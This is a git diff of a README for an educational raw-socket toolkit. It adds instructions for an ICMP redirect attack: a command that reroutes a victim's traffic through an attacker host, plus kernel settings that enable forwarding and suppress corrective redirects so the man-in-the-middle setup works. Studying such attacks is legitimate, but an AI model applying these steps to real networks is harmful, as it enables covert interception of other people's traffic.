@@ -3,6 +3,8 @@
 ## About
 Collection of scripts working with raw socket. Written for self education on common protocols of link and network layers. Transportation and application layers protocols, and their vulnerabilities, will be examined in a different repository.
 
+Efficiency and best practices are out of the scope of this repository. This are "learn by doing" scripts gathered together.
+
 ## Disclaimer
 The author is not responsible for the use of this software. This code is shared for educational purpose.
 
@@ -57,9 +59,24 @@ python3 -m agave icmp discovery {subnet}
 python3 -m agave icmp discovery 192.168.1.0/24
 ```
 
+#### Host redirect
+```
+python3 -m agave icmp redirect {target} {attacker} {victim} {gateway}
+```
+Example: redirects 192.168.0.3's (victim) messages for Google server DNS (target) to 192.168.0.2 (attacker). 192.168.0.1 is the router the victim is gonna use to reach the target.
+```
+python3 -m agave icmp redirect 8.8.8.8 192.168.0.2 192.168.0.3 192.168.0.1
+```
+The command above is enough to get a couple of messages from the victim. But your system will not forward the messages to their destination, and will tell the victim to use another router to reach the destination. So you'll need also to:
+```
+# Enable forwarding
+echo 1 | sudo tee /proc/sys/net/ipv4/conf/*/forwarding
+# Prevent your system from redirecting the victim back to the right router
+echo 0 | sudo tee /proc/sys/net/ipv4/conf/*/send_redirects
+```
+
+
 ## TODOs
-- ICMP mitm
-- ICMP scanner
 - IRDP spoofing
 - MAC flooding
 - port stealing
